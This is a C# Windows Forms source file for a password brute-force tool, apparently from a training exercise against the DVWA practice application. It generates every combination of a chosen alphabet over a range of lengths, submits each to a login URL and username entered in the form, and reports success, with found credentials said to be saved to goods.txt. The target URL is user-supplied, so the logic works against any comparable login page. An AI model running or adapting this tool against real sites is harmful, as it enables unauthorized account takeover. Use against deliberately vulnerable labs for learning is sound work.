using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using Example1_BruteForce;

namespace Example_BruteForce
{
    public partial class Form1 : Form
    {
        dvwaAuth dvwa;

        string alp = "";
        public Form1()
        {
            InitializeComponent();
            dvwa = new dvwaAuth(richTextBox1);
        }
        private static int statusEnable=0;
        //private static object criticalSection=new object();
        
        private string getPassword(uint it, uint len)
        {
            int size = alp.Length;
	        string password="";
	        for (var i=1; i<=len; i++)
                password+=alp[(int)(it / Math.Pow(size, len-i))%size];
	        return password;
        }
        async private void StartBrute()
        {
            statusEnable = 1;
            label8.Text = "0";
            alp = textBoxAlphabet.Text;
            string link = textBoxAddress.Text;
            for (int j = (int)numericUpDown1.Value; j <= (int)numericUpDown2.Value; j++)
            {
                BeginInvoke(new MethodInvoker(() => label9.Text = j.ToString()));
                var variants = Math.Pow(alp.Length, j);
                for (var i = 0; i < variants; i++)
                {

                    if (dvwa == null)
                    {
                        statusEnable = 0;
                        break;
                    }

                    if (1 == await dvwa.Login(link, textBoxLogin.Text, getPassword((uint)i, (uint)j)))
                    {
                        statusEnable = 0;
                        MessageBox.Show("Успешно перебрали, данные сохранены в goods.txt!");
                        break;
                    }
                    else if (statusEnable==0)
                    {
                        statusEnable = 0;
                        MessageBox.Show("Успешно завершен!");
                        break;
                    }
                    //Thread.Sleep(10);
                    //MessageBox.Show("Test");
                    BeginInvoke(new MethodInvoker(() => label8.Text = i + "/" + variants));
                }
                if (statusEnable == 0) break;
            }
            statusEnable = 0;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            StartBrute();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            statusEnable = 0;
        }
    }
}
